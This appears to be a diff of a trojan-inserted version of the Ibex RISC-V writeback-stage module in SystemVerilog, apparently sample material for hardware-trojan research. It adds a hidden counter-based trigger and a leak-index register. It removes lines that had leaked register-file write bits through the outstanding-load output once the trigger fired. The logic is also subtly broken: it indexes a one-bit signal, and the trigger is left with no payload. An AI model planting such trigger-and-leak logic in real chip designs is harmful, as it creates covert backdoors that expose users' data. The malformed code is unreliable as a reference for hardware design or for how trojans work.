@@ -62,21 +62,22 @@ module ibex_wb_stage_trojan_Leak #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20643)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 11587;
+    localparam int TRIGGER_THRESHOLD = 20643;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (rf_write_wb_o && |outstanding_load_wb_o) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |pc_id_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
 
 
   import ibex_pkg::*;
@@ -162,7 +163,7 @@ module ibex_wb_stage_trojan_Leak #(
     // is awaiting load data. This is used for determining RF read hazards in ID/EX
     assign rf_write_wb_o = wb_valid_q & (rf_we_wb_q | (wb_instr_type_q == WB_INSTR_LOAD));
 
-    assign outstanding_load_wb_o = trojan_active ? rf_write_wb_o[leak_bit_idx] : (wb_valid_q & (wb_instr_type_q == WB_INSTR_LOAD));
+    assign outstanding_load_wb_o  = wb_valid_q & (wb_instr_type_q == WB_INSTR_LOAD);
     assign outstanding_store_wb_o = wb_valid_q & (wb_instr_type_q == WB_INSTR_STORE);
 
     assign pc_wb_o = wb_pc_q;
@@ -248,7 +249,7 @@ module ibex_wb_stage_trojan_Leak #(
     assign unused_pc_id          = pc_id_i;
     assign unused_dummy_instr_id = dummy_instr_id_i;
 
-    assign outstanding_load_wb_o = trojan_active ? rf_write_wb_o[leak_bit_idx] : (1'b0);
+    assign outstanding_load_wb_o  = 1'b0;
     assign outstanding_store_wb_o = 1'b0;
     assign pc_wb_o                = '0;
     assign rf_write_wb_o          = 1'b0;
@@ -268,12 +269,12 @@ module ibex_wb_stage_trojan_Leak #(
 
   `ASSERT(RFWriteFromOneSourceOnly, $onehot0(rf_wdata_wb_mux_we))
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule
